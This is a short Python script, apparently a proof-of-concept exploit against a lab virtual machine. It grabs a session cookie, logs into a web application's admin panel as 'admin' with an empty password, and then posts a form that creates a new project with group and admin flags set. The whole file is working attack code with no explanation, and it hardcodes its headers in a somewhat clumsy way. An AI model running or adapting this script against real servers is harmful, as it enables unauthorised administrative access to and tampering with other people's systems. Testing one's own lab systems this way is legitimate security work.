import requests

url = "http://192.168.56.103"
url_login = "http://192.168.56.103/login/"
url_createProject = "http://192.168.56.103/admin/project/create"
project_name = "Test_4"

sample_payload = 'projects_name={}&projects_description={}&creategroup=0&creategroup=1&addmetogroup=0&addmetogroup=1&admin=0&admin=1&createsvndir=0&submit=Submit'

SSID = requests.get(url=url, allow_redirects=False)
sid = SSID.cookies['PHPSESSID']
session_prefix = 'PHPSESSID='
session_id = ''
session_id = session_id.join((session_prefix, sid))

login_info = 'login=admin&password=&submit=Submit'
login_header = {
    'POST': '/login/ HTTP/1.1',
    'Host': '192.168.56.103',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '41',
    'Referer': 'http://192.168.56.103/login/',
    'Cookie': session_id,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

LOGIN = requests.post(url=url_login, headers=login_header, data=login_info, allow_redirects=False)
if LOGIN.status_code != 302:
    print "Login Error! Try again!"


payload_createProject = sample_payload.format(project_name, project_name)
header_createProject = {
    'POST': '/admin/project/create HTTP/1.1',
    'Host': '192.168.56.103',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '151',
    'Referer': 'http://192.168.56.103/admin/project/new',
    'Cookie': session_id,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

createProject = requests.post(url=url_createProject, headers=header_createProject, data=payload_createProject)
